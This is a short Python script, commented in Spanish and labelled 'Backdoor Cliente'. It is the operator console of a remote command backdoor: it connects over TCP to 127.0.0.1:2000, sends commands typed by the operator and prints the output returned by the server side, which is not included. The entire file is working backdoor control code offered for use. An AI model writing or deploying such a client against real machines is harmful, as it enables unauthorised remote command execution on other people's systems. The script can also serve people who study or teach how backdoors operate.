"""
Uso: Backdoor Cliente
Creado: Andrés Hernández Mata
Version: 1.0.0
Python: 3.9.1
Fecha: 08 Abril 2020
"""

import socket
import sys

servidor = ("127.0.0.1", 2000)
bufferSize = 1024

TCPClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TCPClientSocket.connect(servidor)
print("[+] Estableciendo conexión...")

while True:
    print("[-] Ingrese el comando a ejecutar...")
    comando = input("> ")
    if comando == "exit":
        print("[-] Cerrando conexion...")        
        TCPClientSocket.close()
        print("[+] Saliendo...")        
        print("[-] Bye")
        sys.exit()
    else:
        print("[+] Enviando comando...")
        TCPClientSocket.sendto(str.encode(comando), servidor)
        salida = TCPClientSocket.recv(bufferSize)
        print("[-] Espere un momento...")
        resultado = salida.decode()
        print("[+] Salida")
        print(resultado)

